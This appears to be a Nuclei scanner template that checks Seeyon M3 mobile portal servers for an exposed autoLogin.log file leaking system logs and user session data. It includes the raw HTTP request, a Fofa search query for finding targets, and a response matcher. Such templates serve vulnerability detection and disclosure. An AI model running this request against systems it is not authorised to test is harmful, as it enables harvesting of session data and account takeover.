
id: seeyon_m3_mobile_portal_Logs_Leakage

info:
  name: seeyon_m3_mobile_portal_Logs_Leakage
  author: HK
  severity: high
  description: seeyon M3 Mobile Collaboration Software Sensitive Information Leakage (System Logs, User Session) 
  metadata:
    max-request: 1
    Fofa-query: icon_hash="1218371260"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /mobile_portal/logs/autoLogin.log HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: zh-CN,zh;q=0.9

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - AUTOLOGIN.transLogin